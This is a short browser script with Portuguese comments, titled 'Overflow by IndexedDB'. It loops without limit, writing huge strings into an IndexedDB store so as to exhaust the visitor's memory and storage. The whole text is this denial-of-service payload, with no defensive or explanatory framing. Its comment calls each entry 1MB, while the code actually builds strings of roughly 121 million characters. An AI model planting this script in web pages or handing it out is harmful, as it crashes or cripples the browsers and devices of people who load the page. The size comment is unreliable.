//Overflow by IndexedDB

<script>
// Função para consumir memória excessivamente com IndexedDB
var request = indexedDB.open('myDatabase'); // Abre uma conexão IndexedDB

request.onupgradeneeded = function(event) {
    var db = event.target.result;
    var objectStore = db.createObjectStore('store', { autoIncrement: true });

    while (true) {
        try {
            objectStore.add({ data: 'x'.repeat(11024 * 11024) }); // Adiciona uma entrada de 1MB ao IndexedDB
        } catch (e) {
            console.error("Erro ao adicionar entrada no IndexedDB:", e); // Exibe qualquer erro no console
            break;
        }
    }
};
</script>
